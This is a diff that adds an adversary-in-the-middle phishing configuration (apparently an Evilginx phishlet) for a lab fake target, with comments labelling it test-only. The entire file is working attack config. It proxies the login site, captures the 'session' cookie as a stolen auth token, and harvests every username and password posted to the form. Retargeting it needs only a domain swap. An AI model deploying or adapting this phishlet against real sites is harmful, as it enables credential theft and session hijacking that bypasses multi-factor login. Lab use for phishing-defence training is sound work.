@@ -1,0 +1,27 @@
+# LAB phishlet for the fake target in server.go.
+# Replace fake-target.example.com with a host you own (TLS on 8443, e.g. behind Caddy).
+
+name: 'faketarget-lab'
+author: 'lab interno - solo test'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'fake-target.example.com:8443', session: true, is_landing: true, auto_filter: true}
+
+auth_tokens:
+  - domain: 'fake-target.example.com:8443'
+    keys: ['session']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'fake-target.example.com:8443'
+  path: '/login'
